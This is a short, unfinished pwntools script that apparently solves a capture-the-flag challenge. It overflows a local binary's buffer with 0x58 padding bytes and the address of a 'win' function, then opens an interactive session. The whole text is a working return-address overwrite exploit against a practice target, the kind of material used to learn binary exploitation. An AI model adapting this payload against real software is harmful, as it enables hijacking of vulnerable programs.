from pwn import * 
binary = context.binary = ELF('./chall_04')
p = process(binary.path)
p.sendline(b'' + (0x60 - 0x8)*b'A' + p64(binary.sym.win))
p.interactive()
#NOT FINISHED
